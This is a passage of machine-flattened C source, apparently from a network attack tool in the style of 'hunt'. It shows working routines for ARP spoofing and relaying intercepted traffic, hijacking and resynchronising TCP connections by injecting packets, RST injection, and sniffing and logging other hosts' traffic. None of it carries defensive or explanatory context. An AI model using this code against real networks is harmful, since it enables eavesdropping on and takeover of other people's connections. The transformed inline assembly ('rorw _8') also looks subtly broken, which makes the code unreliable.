static signed int find_asi_dst_mac(struct arp_spoof_info *asi, char *error_label)
{
  struct mac_info *mi_dst;
  if(asi->dst_mac_valid == 0)
  {
    mac_discover(asi->dst_addr, 2);
    sec_nanosleep(1);
    mi_dst=mac_info_get(asi->dst_addr);
    if(mi_dst == ((struct mac_info *)NULL))
    {
      if(!(error_label == ((char *)NULL)))
        printf("%s", error_label);

      return -2;
    }

    memcpy((void *)asi->dst_mac, (const void *)mi_dst->mac, (unsigned long int)6);
    asi->dst_mac_valid = 1;
    mac_info_release(mi_dst);
  }

  return 0;
}

// finish_c_handler
// file main.c line 436
void finish_c_handler(signed int sig)
{
  exit(1);
}

// force_arp_spoof
// file arpspoof.c line 501
void force_arp_spoof(struct arp_spoof_info *asi, signed int count)
{
  signed int i;
  if(!(asi->dst_mac_valid == 0))
  {
    i = 0;
    for( ; !(i >= count); i = i + 1)
    {
      send_src_spoof_to_dst(asi);
      unsigned int return_value___bswap_32_1;
      return_value___bswap_32_1=__bswap_32_link6(asi->dst_addr);
      unsigned int return_value___bswap_32_2;
      return_value___bswap_32_2=__bswap_32_link6(return_value___bswap_32_1 + (unsigned int)1);
      send_src_spoof_to_dst_through_request(asi, return_value___bswap_32_2);
    }
  }

  else
    printf("Warning: cannot try to force arp spoof while dst mac is not known\n");
}

// free_sniff_info
// file sniff.c line 106
void free_sniff_info(struct sniff_info *si)
{
  struct sniff_log *slog;
  if(!(si->search == ((char *)NULL)))
    free((void *)si->search);

  void *return_value_list_pop_1;
  do
  {
    return_value_list_pop_1=list_pop(&si->log);
    slog = (struct sniff_log *)return_value_list_pop_1;
    if(slog == ((struct sniff_log *)NULL))
      break;

    free_sniff_log(slog);
  }
  while((_Bool)1);
  if(!(si->file == ((struct _IO_FILE *)NULL)))
  {
    if(!(si->file_close == 0))
      fclose(si->file);

  }

  free((void *)si);
}

// free_sniff_log
// file sniff.c line 97
void free_sniff_log(struct sniff_log *slog)
{
  if(!(slog->buf == ((char *)NULL)))
    free((void *)slog->buf);

  if(!(slog->file_close == 0))
    fclose(slog->file);

  free((void *)slog);
}

// func_arp
// file arpspoof.c line 179
static void func_arp(struct packet *p, void *arg)
{
  struct list_iterator li;
  struct arphdr *arph;
  struct arpeth_hdr *arpethh;
  struct arp_spoof_info *asi;
  struct timejob *tj;
  arph = p->p_arph;
  arpethh = (struct arpeth_hdr *)(arph + (signed long int)1);
  unsigned short int tmp_statement_expression_1;
  unsigned short int __v;
  unsigned short int __x = (unsigned short int)0x0800;
  asm("rorw _8, %w0" : "=r"(__v) : "0"(__x) : "cc");
  tmp_statement_expression_1 = __v;
  unsigned short int tmp_statement_expression_6;
  void *return_value_list_iter_get_2;
  unsigned short int tmp_statement_expression_5;
  void *return_value_list_iter_get_3;
  if(arph->ar_pro == tmp_statement_expression_1)
  {
    list_lock(&l_arp_spoof);
    list_iter_set(&li, &l_arp_spoof);
    unsigned short int func_arp__1__2____v;
    unsigned short int func_arp__1__2____x = (unsigned short int)2;
    asm("rorw _8, %w0" : "=r"(func_arp__1__2____v) : "0"(func_arp__1__2____x) : "cc");
    tmp_statement_expression_6 = func_arp__1__2____v;
    if(arph->ar_op == tmp_statement_expression_6)
      do
      {
        return_value_list_iter_get_2=list_iter_get(&li);
        asi = (struct arp_spoof_info *)return_value_list_iter_get_2;
        if(asi == ((struct arp_spoof_info *)NULL))
          break;

        if(*((unsigned int *)arpethh->ar_sip) == asi->src_addr)
        {
          if(*((unsigned int *)arpethh->ar_tip) == asi->dst_addr)
          {
            if(asi->dst_mac_valid == 0)
            {
              memcpy((void *)asi->dst_mac, (const void *)arpethh->ar_tha, (unsigned long int)6);
              asi->dst_mac_valid = 1;
            }

            if(asi->src_mac_valid == 0)
            {
              memcpy((void *)asi->src_mac, (const void *)arpethh->ar_sha, (unsigned long int)6);
              asi->src_mac_valid = 1;
            }

            if(!(asi->tj_reply == ((struct timejob *)NULL)))
            {
              unregister_timejob(asi->tj_reply);
              free((void *)asi->tj_reply);
              asi->tj_reply = (struct timejob *)(void *)0;
            }

            send_src_spoof_to_dst(asi);
          }

        }

      }
      while((_Bool)1);

    else
    {
      unsigned short int func_arp__1__4____v;
      unsigned short int func_arp__1__4____x = (unsigned short int)1;
      asm("rorw _8, %w0" : "=r"(func_arp__1__4____v) : "0"(func_arp__1__4____x) : "cc");
      tmp_statement_expression_5 = func_arp__1__4____v;
      if(arph->ar_op == tmp_statement_expression_5)
        do
        {
          return_value_list_iter_get_3=list_iter_get(&li);
          asi = (struct arp_spoof_info *)return_value_list_iter_get_3;
          if(asi == ((struct arp_spoof_info *)NULL))
            break;

          if(*((unsigned int *)arpethh->ar_sip) == asi->dst_addr)
          {
            if(*((unsigned int *)arpethh->ar_tip) == asi->src_addr)
            {
              if(asi->dst_mac_valid == 0)
              {
                memcpy((void *)asi->dst_mac, (const void *)arpethh->ar_sha, (unsigned long int)6);
                asi->dst_mac_valid = 1;
              }

              if(asi->src_mac_valid == 0)
                mac_discover(asi->src_addr, 1);

              send_src_spoof_to_dst(asi);
              if(!(asi->tj_reply == ((struct timejob *)NULL)))
              {
                unregister_timejob(asi->tj_reply);
                free((void *)asi->tj_reply);
                asi->tj_reply = (struct timejob *)(void *)0;
              }

              void *return_value_malloc_4;
              return_value_malloc_4=malloc(sizeof(struct timejob) /*48ul*/ );
              tj = (struct timejob *)return_value_malloc_4;
              tj->j_func = arp_spoof_timejob;
              tj->j_arg = (void *)asi;
              tj->j_arg_sec = 0;
              asi->tj_reply = tj;
              register_timejob_milsec_rel(tj, 200);
            }

          }

          if(*((unsigned int *)arpethh->ar_sip) == asi->src_addr)
          {
            if(!(asi->dst_mac_valid == 0))
            {
              if(!(arp_request_spoof_through_request == 0))
                send_src_spoof_to_dst_through_request(asi, *((unsigned int *)arpethh->ar_tip));

              else
                send_src_spoof_to_dst(asi);
            }

          }

        }
        while((_Bool)1);

    }
    list_iter_end(&li);
    list_unlock(&l_arp_spoof);
  }

}

// func_arp_packet
// file hostup.c line 49
static void func_arp_packet(struct packet *p, void *arg)
{
  struct host_up_info *hui = (struct host_up_info *)arg;
  struct arpeth_hdr *arpethh;
  unsigned int ip;
  arpethh = (struct arpeth_hdr *)(p->p_arph + (signed long int)1);
  ip = *((unsigned int *)arpethh->ar_sip);
  unsigned short int tmp_statement_expression_5;
  unsigned short int __v;
  unsigned short int __x = (unsigned short int)2;
  asm("rorw _8, %w0" : "=r"(__v) : "0"(__x) : "cc");
  tmp_statement_expression_5 = __v;
  unsigned int return_value___bswap_32_3;
  unsigned int return_value___bswap_32_4;
  unsigned int return_value___bswap_32_1;
  unsigned int return_value___bswap_32_2;
  if(p->p_arph->ar_op == tmp_statement_expression_5)
  {
    return_value___bswap_32_3=__bswap_32_link7(ip);
    return_value___bswap_32_4=__bswap_32_link7(hui->start_addr);
    if(return_value___bswap_32_3 >= return_value___bswap_32_4)
    {
      return_value___bswap_32_1=__bswap_32_link7(ip);
      return_value___bswap_32_2=__bswap_32_link7(hui->end_addr);
      if(return_value___bswap_32_2 >= return_value___bswap_32_1)
      {
        packet_want(p);
        list_produce(&l_arp_packet, (void *)p);
      }

    }

  }

}

// func_dump_connection_dst
// file main.c line 78
void func_dump_connection_dst(struct packet *p, struct user_conn_info *arg)
{
  if((unsigned long int)p->p_iph->saddr == arg->dst_addr)
  {
    if((unsigned long int)p->p_iph->daddr == arg->src_addr)
    {
      if(p->p_hdr.p_tcph->_anon0._anon1.source == arg->dst_port)
      {
        if(p->p_hdr.p_tcph->_anon0._anon1.dest == arg->src_port)
        {
          packet_want(p);
          list_produce(&l_dump_connection, (void *)p);
        }

      }

    }

  }

}

// func_dump_connection_src
// file main.c line 89
void func_dump_connection_src(struct packet *p, struct user_conn_info *arg)
{
  if((unsigned long int)p->p_iph->saddr == arg->src_addr)
  {
    if((unsigned long int)p->p_iph->daddr == arg->dst_addr)
    {
      if(p->p_hdr.p_tcph->_anon0._anon1.source == arg->src_port)
      {
        if(p->p_hdr.p_tcph->_anon0._anon1.dest == arg->dst_port)
        {
          packet_want(p);
          list_produce(&l_dump_connection, (void *)p);
        }

      }

    }

  }

}

// func_hijack_dst
// file hijack.c line 44
void func_hijack_dst(struct packet *p, struct conn_info *arg)
{
  if((unsigned long int)p->p_iph->saddr == arg->dst_addr)
  {
    if((unsigned long int)p->p_iph->daddr == arg->src_addr)
    {
      if(p->p_hdr.p_tcph->_anon0._anon1.source == arg->dst_port)
      {
        if(p->p_hdr.p_tcph->_anon0._anon1.dest == arg->src_port)
        {
          packet_want(p);
          list_produce(&l_hijack_conn, (void *)p);
        }

      }

    }

  }

}

// func_hijack_dst_sync
// file synchijack.c line 22
void func_hijack_dst_sync(struct packet *p, struct conn_info *arg)
{
  if((unsigned long int)p->p_iph->saddr == arg->dst_addr)
  {
    if((unsigned long int)p->p_iph->daddr == arg->src_addr)
    {
      if(p->p_hdr.p_tcph->_anon0._anon1.source == arg->dst_port)
      {
        if(p->p_hdr.p_tcph->_anon0._anon1.dest == arg->src_port)
        {
          packet_want(p);
          list_produce(&l_hijack_conn, (void *)p);
        }

      }

    }

  }

}

// func_hijack_src
// file hijack.c line 55
void func_hijack_src(struct packet *p, struct conn_info *arg)
{
  if((unsigned long int)p->p_iph->saddr == arg->src_addr)
  {
    if((unsigned long int)p->p_iph->daddr == arg->dst_addr)
    {
      if(p->p_hdr.p_tcph->_anon0._anon1.source == arg->src_port)
      {
        if(p->p_hdr.p_tcph->_anon0._anon1.dest == arg->dst_port)
        {
          packet_want(p);
          list_produce(&l_hijack_conn, (void *)p);
        }

      }

    }

  }

}

// func_hijack_src_sync
// file synchijack.c line 47
void func_hijack_src_sync(struct packet *p, struct conn_info *arg)
{
  if((unsigned long int)p->p_iph->saddr == arg->src_addr)
  {
    if((unsigned long int)p->p_iph->daddr == arg->dst_addr)
    {
      if(p->p_hdr.p_tcph->_anon0._anon1.source == arg->src_port)
      {
        if(p->p_hdr.p_tcph->_anon0._anon1.dest == arg->dst_port)
        {
          packet_want(p);
          list_produce(&l_hijack_conn, (void *)p);
        }

      }

    }

  }

}

// func_icmp_packet
// file hostup.c line 35
static void func_icmp_packet(struct packet *p, void *arg)
{
  struct iphdr *iph = p->p_iph;
  struct icmphdr *icmph = p->p_hdr.p_icmph;
  struct host_up_info *hui = (struct host_up_info *)arg;
  unsigned int return_value___bswap_32_3;
  return_value___bswap_32_3=__bswap_32_link7(iph->saddr);
  unsigned int return_value___bswap_32_4;
  return_value___bswap_32_4=__bswap_32_link7(hui->start_addr);
  unsigned int return_value___bswap_32_1;
  unsigned int return_value___bswap_32_2;
  if(return_value___bswap_32_3 >= return_value___bswap_32_4)
  {
    return_value___bswap_32_1=__bswap_32_link7(iph->saddr);
    return_value___bswap_32_2=__bswap_32_link7(hui->end_addr);
    if(return_value___bswap_32_2 >= return_value___bswap_32_1)
    {
      if((signed int)icmph->type == 0)
      {
        if((signed int)icmph->code == 0)
        {
          packet_want(p);
          list_produce(&l_icmp_packet, (void *)p);
        }

      }

    }

  }

}

// func_relay
// file arpspoof.c line 598
static void func_relay(struct packet *p, void *arg)
{
  struct list_iterator li;
  struct arp_spoof_info *asi;
  list_lock(&l_arp_spoof);
  list_iter_set(&li, &l_arp_spoof);
  void *return_value_list_iter_get_1;
  _Bool tmp_if_expr_6;
  _Bool tmp_if_expr_5;
  _Bool tmp_if_expr_4;
  signed int return_value_memcmp_3;
  signed int return_value_memcmp_2;
  do
  {
    return_value_list_iter_get_1=list_iter_get(&li);
    asi = (struct arp_spoof_info *)return_value_list_iter_get_1;
    if(asi == ((struct arp_spoof_info *)NULL))
      break;

    if(p->p_iph->saddr == asi->dst_addr)
      tmp_if_expr_6 = (_Bool)1;

    else
      tmp_if_expr_6 = asi->can_forward != 0 ? (_Bool)1 : (_Bool)0;
    if(tmp_if_expr_6)
    {
      if(p->p_iph->daddr == asi->src_addr)
        tmp_if_expr_5 = (_Bool)1;

      else
        tmp_if_expr_5 = asi->can_forward != 0 ? (_Bool)1 : (_Bool)0;
      if(tmp_if_expr_5)
      {
        if(asi->dst_mac_valid == 0)
          tmp_if_expr_4 = (_Bool)1;

        else
        {
          return_value_memcmp_3=memcmp((const void *)p->p_ethh->h_source, (const void *)asi->dst_mac, (unsigned long int)6);
          tmp_if_expr_4 = return_value_memcmp_3 == 0 ? (_Bool)1 : (_Bool)0;
        }
        if(tmp_if_expr_4)
        {
          return_value_memcmp_2=memcmp((const void *)p->p_ethh->h_dest, (const void *)asi->src_fake_mac, (unsigned long int)6);
          if(return_value_memcmp_2 == 0)
          {
            packet_want(p);
            asi_want(asi);
            p->p_arg[(signed long int)3] = (void *)asi;
            list_produce(&l_relay_pkt, (void *)p);
            break;
          }

        }

      }

    }

  }
  while((_Bool)1);
  list_iter_end(&li);
  list_unlock(&l_arp_spoof);
}

// func_sniff
// file sniff.c line 187
static void func_sniff(struct packet *p, void *arg)
{
  struct list_iterator li;
  struct sniff_info *si;
  list_lock(&l_sniff_db);
  list_iter_set(&li, &l_sniff_db);
  void *return_value_list_iter_get_1;
  do
  {
    return_value_list_iter_get_1=list_iter_get(&li);
    si = (struct sniff_info *)return_value_list_iter_get_1;
    if(si == ((struct sniff_info *)NULL))
      break;

    signed int return_value_sniff_packet_match_2;
    return_value_sniff_packet_match_2=sniff_packet_match(p, si);
    if(!(return_value_sniff_packet_match_2 == 0))
    {
      packet_want(p);
      sniff_info_want(si);
      p->p_arg[(signed long int)4] = (void *)si;
      list_produce(&l_sniff_pkt, (void *)p);
      break;
    }

  }
  while((_Bool)1);
  list_iter_end(&li);
  list_unlock(&l_sniff_db);
}

// func_tcp_packet
// file rstd.c line 78
static void func_tcp_packet(struct packet *p, void *arg)
{
  struct rst_db_item *dbi;
  if(p->p_hdr.p_tcph->_anon0._anon1.fin == 0)
  {
    dbi=packet_match_db(p);
    if(!(dbi == ((struct rst_db_item *)NULL)))
    {
      packet_want(p);
      p->p_arg[(signed long int)2] = (void *)dbi->rst_mode;
      list_produce(&l_rst_packet, (void *)p);
    }

  }

}

// generate_key
// file hunt.h line 294
static inline unsigned int generate_key(unsigned long int saddr, unsigned long int daddr, unsigned short int source, unsigned short int dest)
{
  return (unsigned int)(saddr + daddr + (unsigned long int)source + (unsigned long int)dest);
}

// generate_key_link1
// file hunt.h line 294
static inline unsigned int generate_key_link1(unsigned long int saddr_link1, unsigned long int daddr_link1, unsigned short int source_link1, unsigned short int dest_link1)
{
  return (unsigned int)(saddr_link1 + daddr_link1 + (unsigned long int)source_link1 + (unsigned long int)dest_link1);
}

// get_arp_spoof
// file hunt.h line 524
struct arp_spoof_info * get_arp_spoof(unsigned int src_addr, unsigned int dst_addr)
{
  struct list_iterator li;
  struct arp_spoof_info *asi;
  struct arp_spoof_info *retval = (struct arp_spoof_info *)(void *)0;
  list_iter_set(&li, &l_arp_spoof);
  void *return_value_list_iter_get_1;
  do
  {
    return_value_list_iter_get_1=list_iter_get(&li);
    asi = (struct arp_spoof_info *)return_value_list_iter_get_1;
    if(asi == ((struct arp_spoof_info *)NULL))
      break;

    if(asi->src_addr == src_addr)
    {
      if(asi->dst_addr == dst_addr)
      {
        if(!(asi->src_mac_valid == 0))
        {
          if(!(asi->dst_mac_valid == 0))
          {
            retval = asi;
            break;
          }

        }

      }

    }

  }
  while((_Bool)1);
  list_iter_end(&li);
  return retval;
}

// get_asi
// file arpspoof.c line 310
static struct arp_spoof_info * get_asi(unsigned int src_addr, unsigned int dst_addr)
{
  struct list_iterator li;
  struct arp_spoof_info *asi;
  struct arp_spoof_info *retval = (struct arp_spoof_info *)(void *)0;
  list_iter_set(&li, &l_arp_spoof);
  void *return_value_list_iter_get_1;
  do
  {
    return_value_list_iter_get_1=list_iter_get(&li);
    asi = (struct arp_spoof_info *)return_value_list_iter_get_1;
    if(asi == ((struct arp_spoof_info *)NULL))
      break;

    if(asi->src_addr == src_addr)
    {
      if(asi->dst_addr == dst_addr)
      {
        retval = asi;
        break;
      }

    }

  }
  while((_Bool)1);
  list_iter_end(&li);
  return retval;
}

// get_ifc_info
// file tap.c line 110
signed int get_ifc_info(char *ifc_name, unsigned int *ip, char *mac)
{
  signed int fd;
  struct ifreq ifr;
  unsigned short int tmp_statement_expression_1;
  unsigned short int __v;
  unsigned short int __x = (unsigned short int)0x0003;
  asm("rorw _8, %w0" : "=r"(__v) : "0"(__x) : "cc");
  tmp_statement_expression_1 = __v;
  fd=socket(2, 3, (signed int)tmp_statement_expression_1);
  if(!(fd >= 0))
    return -1;

  else
  {
    __builtin_strncpy(ifr.ifr_ifrn.ifrn_name, ifc_name, (unsigned long int)16);
    ifr.ifr_ifrn.ifrn_name[(signed long int)(16 - 1)] = (char)0;
    if(!(ip == ((unsigned int *)NULL)))
    {
      signed int return_value_ioctl_2;
      return_value_ioctl_2=ioctl(fd, (unsigned long int)0x8915, &ifr);
      if(!(return_value_ioctl_2 >= 0))
      {
        close(fd);
        return -1;
      }

      *ip = *((unsigned int *)(ifr.ifr_ifru.ifru_addr.sa_data + (signed long int)2));
    }

    if(!(mac == ((char *)NULL)))
    {
      signed int return_value_ioctl_3;
      return_value_ioctl_3=ioctl(fd, (unsigned long int)0x8927, &ifr);
      if(!(return_value_ioctl_3 >= 0))
      {
        close(fd);
        return -1;
      }

      memcpy((void *)mac, (const void *)ifr.ifr_ifru.ifru_hwaddr.sa_data, (unsigned long int)6);
      printf("mac on %s ", ifc_name);
      print_eth_mac((unsigned char *)mac);
      printf("\n");
    }

    close(fd);
    return 0;
  }
}

// getchar
// file /usr/include/x86_64-linux-gnu/bits/stdio.h line 44
static inline signed int getchar(void)
{
  signed int return_value__IO_getc_1;
  return_value__IO_getc_1=_IO_getc(stdin);
  return return_value__IO_getc_1;
}

// getchar_link1
// file /usr/include/x86_64-linux-gnu/bits/stdio.h line 44
static inline signed int getchar_link1(void)
{
  signed int return_value__IO_getc_1_link1;
  return_value__IO_getc_1_link1=_IO_getc(stdin);
  return return_value__IO_getc_1_link1;
}

// handle_response
// file resolv.c line 329
static void handle_response(signed int fd, struct slave *sl)
{
  char buf[256l];
  struct res *res = (struct res *)buf;
  signed long int return_value_read_1;
  return_value_read_1=read(sl->s_fd, (void *)buf, sizeof(struct res) /*12ul*/ );
  if((unsigned long int)return_value_read_1 == sizeof(struct res) /*12ul*/ )
  {
    if(!(res->name_len == 0))
      read(sl->s_fd, (void *)(res + (signed long int)1), (unsigned long int)res->name_len);

    if(res->err == 0)
      write(fd, (const void *)buf, sizeof(struct res) /*12ul*/  + (unsigned long int)res->name_len);

    sl->s_req.ip = (unsigned int)0;
    sl->s_timestamp=time((signed long int *)(void *)0);
  }

}

// hash_count
// file c/hash.h line 59
signed int hash_count(struct hash *h)
{
  signed int retval;
  __lock_link1(h);
  retval = h->h_items;
  __unlock_link1(h);
  return retval;
}

// hash_free
// file c/hash.c line 65
void hash_free(struct hash *h)
{
  if(!(h->h_table == ((struct hash_table_item *)NULL)))
    free((void *)h->h_table);

  memset((void *)h, 0, sizeof(struct hash) /*88ul*/ );
}

// hash_get
// file c/hash.h line 52
void * hash_get(struct hash *h, unsigned int key, void *arg)
{
  signed int hv;
  void *retval;
  __lock_link1(h);
  hv=__hash_find(h, key, arg);
  if(hv >= 0)
    retval = (h->h_table + (signed long int)hv)->ht_data;

  else
    retval = (void *)0;
  __unlock_link1(h);
  return retval;
}

// hash_init
// file c/hash.h line 50
signed int hash_init(struct hash *h, signed int max_items, signed int (*eqfunc)(unsigned int, void *, void *))
{
  if(!(max_items >= 131))
    max_items = 131;

  max_items=__chose_table_size(max_items);
  h->h_space_after=__when_need_space(max_items);
  h->h_items = 0;
  h->h_max_items = max_items;
  h->h_eqfunc = eqfunc;
  void *return_value_malloc_1;
  return_value_malloc_1=malloc((unsigned long int)max_items * sizeof(struct hash_table_item) /*16ul*/ );
  h->h_table = (struct hash_table_item *)return_value_malloc_1;
  if(h->h_table == ((struct hash_table_item *)NULL))
    return -1;

  else
  {
    memset((void *)h->h_table, 0, (unsigned long int)max_items * sizeof(struct hash_table_item) /*16ul*/ );
    h->h_locked = 0;
    pthread_mutex_init(&h->h_mutex, (const union anonymous_9 *)(void *)0);
    return 0;
  }
}

// hash_iter_end
// file c/hash.h line 68
void hash_iter_end(struct hash_iterator *i)
{
  i->i_hash = (struct hash *)(void *)0;
  i->i_pos = 0;
}

// hash_iter_get
// file c/hash.h line 67
void * hash_iter_get(struct hash_iterator *i, unsigned int *keyptr)
{
  struct hash *h;
  void *data;
  void *retval;
  h = i->i_hash;
  data = (void *)0;
  __lock_link1(h);
  for( ; !(i->i_pos >= h->h_max_items); i->i_pos = i->i_pos + 1)
  {
    data = (h->h_table + (signed long int)i->i_pos)->ht_data;
    if(!(data == NULL))
      break;

  }
  if(!(data == NULL) && !(i->i_pos >= h->h_max_items))
  {
    retval = data;
    if(!(keyptr == ((unsigned int *)NULL)))
      *keyptr = (h->h_table + (signed long int)i->i_pos)->ht_key;

  }

  else
    retval = (void *)0;
  i->i_pos = i->i_pos + 1;
  __unlock_link1(h);
  return retval;
}

// hash_iter_lock
// file c/hash.c line 373
void hash_iter_lock(struct hash_iterator *i)
{
  hash_lock(i->i_hash);
}

// hash_iter_set
// file c/hash.h line 66
void hash_iter_set(struct hash_iterator *i, struct hash *h)
{
  i->i_hash = h;
  i->i_pos = 0;
}

// hash_iter_unlock
// file c/hash.c line 378
void hash_iter_unlock(struct hash_iterator *i)
{
  hash_unlock(i->i_hash);
}

// hash_lock
// file c/hash.h line 57
void hash_lock(struct hash *h)
{
  _Bool tmp_if_expr_2;
  unsigned long int return_value_pthread_self_1;
  if(h->h_locked == 0)
    tmp_if_expr_2 = (_Bool)1;

  else
  {
    return_value_pthread_self_1=pthread_self();
    tmp_if_expr_2 = h->h_locked_thr != return_value_pthread_self_1 ? (_Bool)1 : (_Bool)0;
  }
  if(tmp_if_expr_2)
  {
    pthread_mutex_lock(&h->h_mutex);
    h->h_locked_thr=pthread_self();
    h->h_locked = 1;
  }

  else
    h->h_locked = h->h_locked + 1;
}

// hash_put
// file c/hash.h line 54
signed int hash_put(struct hash *h, unsigned int key, void *data)
{
  signed int retval;
  __lock_link1(h);
  signed int return_value___hash_need_space_1;
  return_value___hash_need_space_1=__hash_need_space(h);
  if(!(return_value___hash_need_space_1 == 0))
    __hash_new_space(h);

  if(h->h_items == h->h_max_items || data == NULL)
    retval = -1;

  else
    retval = 0;
  __hash_put(h, key, data);
  __unlock_link1(h);
  return retval;
}

// hash_put_check
// file c/hash.c line 315
signed int hash_put_check(struct hash *h, unsigned int key, void *data, void *arg)
{
  signed int retval;
  __lock_link1(h);
  signed int return_value___hash_need_space_1;
  return_value___hash_need_space_1=__hash_need_space(h);
  if(!(return_value___hash_need_space_1 == 0))
    __hash_new_space(h);

  if(h->h_items == h->h_max_items || data == NULL)
    retval = -1;

  else
    retval=__hash_put_check(h, key, data, arg);
  __unlock_link1(h);
  return retval;
}

// hash_remove
// file c/hash.h line 53
void * hash_remove(struct hash *h, unsigned int key, void *arg)
{
  void *retval;
  signed int hv;
  __lock_link1(h);
  hv=__hash_find(h, key, arg);
  if(hv >= 0)
  {
    retval = (h->h_table + (signed long int)hv)->ht_data;
    (h->h_table + (signed long int)hv)->ht_key = (unsigned int)0;
    (h->h_table + (signed long int)hv)->ht_data = (void *)0;
    h->h_items = h->h_items - 1;
    signed int return_value___hv_next_1;
    return_value___hv_next_1=__hv_next();
    __hash_remap(h, return_value___hv_next_1);
  }

  else
    retval = (void *)0;
  __unlock_link1(h);
  return retval;
}

// hash_unlock
// file c/hash.h line 58
void hash_unlock(struct hash *h)
{
  h->h_locked = h->h_locked - 1;
  if(h->h_locked == 0)
    pthread_mutex_unlock(&h->h_mutex);

}

// hijack_sync
// file synchijack.c line 461
signed int hijack_sync(struct conn_info *ci)
{
  struct ifunc_item ifunc_f;
  struct ifunc_item ifunc_dst;
  struct timespec absts;
  struct timeval now;
  struct sigaction sac;
  struct sigaction old_sac;
  struct packet *p;
  nw_was_negative = 0;
  f_sync_done = 0;
  list_produce_start(&l_hijack_conn);
  ifunc_f.func = (void (*)(struct packet *, void *))func_hijack_src_sync;
  ifunc_f.arg = (void *)ci;
  list_enqueue(&l_ifunc_tcp, (void *)&ifunc_f);
  ifunc_dst.func = (void (*)(struct packet *, void *))func_hijack_dst_sync;
  ifunc_dst.arg = (void *)ci;
  list_enqueue(&l_ifunc_tcp, (void *)&ifunc_dst);
  gettimeofday(&now, (struct timezone *)(void *)0);
  absts.tv_sec = now.tv_sec + (signed long int)100000;
  absts.tv_nsec = (signed long int)0;
  hijack_sync_init_msg(ci);
  sync_was_canceled = 0;
  sac.__sigaction_handler.sa_handler = ctrl_c_sync_handler;
  sigemptyset(&sac.sa_mask);
  sigaddset(&sac.sa_mask, 2);
  sac.sa_flags = 0x10000000;
  sigaction(2, &sac, &old_sac);
  if(!(need_write >= 0))
    nw_was_negative = 0;

  need_read_write_init();
  if(!(need_read >= 0) || !(need_write >= 0))
    need_read_write_negative(ci);

  _Bool tmp_if_expr_2;
  void *return_value_list_consume_1;
  if(!(need_read == 0) || !(need_write == 0))
    while((_Bool)1)
    {
      if(f_sync_done == 0)
      {
        return_value_list_consume_1=list_consume(&l_hijack_conn, (struct timespec *)(void *)0);
        p = (struct packet *)return_value_list_consume_1;
        tmp_if_expr_2 = p != ((struct packet *)NULL) ? (_Bool)1 : (_Bool)0;
      }

      else
        tmp_if_expr_2 = (_Bool)0;
      if(tmp_if_expr_2)
        f_hijack_sync(p, ci);

      else
        break;
      if(!(sync_was_canceled == 0))
        break;

    }

  list_remove(&l_ifunc_tcp, (void *)&ifunc_f);
  list_remove(&l_ifunc_tcp, (void *)&ifunc_dst);
  packet_flush(&l_hijack_conn);
  if(!(sync_was_canceled == 0))
    press_key("\n-- press any key> ");

  sigaction(2, &old_sac, (struct sigaction *)(void *)0);
  if(!(sync_was_canceled == 0))
    return -1;

  else
    return 0;
}

// hijack_sync_init_msg
// file synchijack.c line 123
static void hijack_sync_init_msg(struct conn_info *ci)
{
  signed int len;
  signed int msg_len;
  char buf[128l];
  struct tcp_spec ts;
  unsigned int return_value___bswap_32_1;
  return_value___bswap_32_1=__bswap_32_link5((unsigned int)ci->dst.next_d_seq);
  unsigned int return_value___bswap_32_2;
  return_value___bswap_32_2=__bswap_32_link5((unsigned int)ci->src.next_seq);
  need_read = (volatile signed int)(return_value___bswap_32_1 - return_value___bswap_32_2);
  unsigned int return_value___bswap_32_3;
  return_value___bswap_32_3=__bswap_32_link5((unsigned int)ci->dst.next_seq);
  unsigned int return_value___bswap_32_4;
  return_value___bswap_32_4=__bswap_32_link5((unsigned int)ci->src.next_d_seq);
  need_write = (volatile signed int)(return_value___bswap_32_3 - return_value___bswap_32_4);
  printf("user have to type %d chars and print %d chars to synchronize connection\n", need_read, need_write);
  ctrl_c_prompt();
  signed int tmp_if_expr_7;
  unsigned short int tmp_statement_expression_6;
  unsigned short int tmp_statement_expression_8;
  unsigned short int tmp_statement_expression_9;
  if(need_read >= 1)
  {
    if(need_write >= 1)
    {
      len = need_write - need_read;
      char *return_value_suggest_sync_msg_5;
      return_value_suggest_sync_msg_5=suggest_sync_msg(1);
      msg_len=sprintf(buf, return_value_suggest_sync_msg_5, need_read);
      if(len >= msg_len)
      {
        len = msg_len;
        memset((void *)&ts, 0, sizeof(struct tcp_spec) /*88ul*/ );
        ts.saddr = ci->dst_addr;
        ts.daddr = ci->src_addr;
        ts.sport = ci->dst_port;
        ts.dport = ci->src_port;
        ts.src_mac = (char *)ci->src.dst_mac;
        ts.dst_mac = (char *)ci->src.src_mac;
        ts.seq = ci->src.next_d_seq;
        ts.ack_seq = ci->src.next_seq;
        if(!(ci->dst.window == 0))
          tmp_if_expr_7 = (signed int)ci->dst.window;

        else
        {
          unsigned short int __v;
          unsigned short int __x = (unsigned short int)242;
          asm("rorw _8, %w0" : "=r"(__v) : "0"(__x) : "cc");
          tmp_statement_expression_6 = __v;
          tmp_if_expr_7 = (signed int)tmp_statement_expression_6;
        }
        ts.window = (unsigned short int)tmp_if_expr_7;
        unsigned short int hijack_sync_init_msg__1__3__2____v;
        unsigned short int hijack_sync_init_msg__1__3__2____x;
        unsigned short int hijack_sync_init_msg__1__3__2__1____v;
        unsigned short int hijack_sync_init_msg__1__3__2__1____x = (unsigned short int)ci->dst.id;
        asm("rorw _8, %w0" : "=r"(hijack_sync_init_msg__1__3__2__1____v) : "0"(hijack_sync_init_msg__1__3__2__1____x) : "cc");
        tmp_statement_expression_9 = hijack_sync_init_msg__1__3__2__1____v;
        hijack_sync_init_msg__1__3__2____x = (unsigned short int)((signed int)tmp_statement_expression_9 + 1);
        asm("rorw _8, %w0" : "=r"(hijack_sync_init_msg__1__3__2____v) : "0"(hijack_sync_init_msg__1__3__2____x) : "cc");
        tmp_statement_expression_8 = hijack_sync_init_msg__1__3__2____v;
        ts.id = tmp_statement_expression_8;
        ts.ack = 1;
        ts.psh = 1;
        ts.rst = 0;
        ts.data = buf;
        ts.data_len = len;
        need_write = need_write - len;
        send_tcp_packet(&ts);
      }

    }

  }

}

// host_lookup
// file hunt.h line 452
char * host_lookup(unsigned int in, signed int use_mode)
{
  struct in_addr addr;
  char *name;
  char *retval;
  signed int len;
  struct hostent *host_ent;
  struct resolv_item *r;
  addr.s_addr = in;
  host_ent = (struct hostent *)(void *)0;
  char *return_value_inet_ntoa_1;
  if(in == 0u)
  {
    return_value_inet_ntoa_1=inet_ntoa(addr);
    return return_value_inet_ntoa_1;
  }

  else
  {
    r = (struct resolv_item *)(void *)0;
    switch(use_mode)
    {
      case 2:
      {
        r=resolv_get(in);
        if(r == ((struct resolv_item *)NULL))
        {
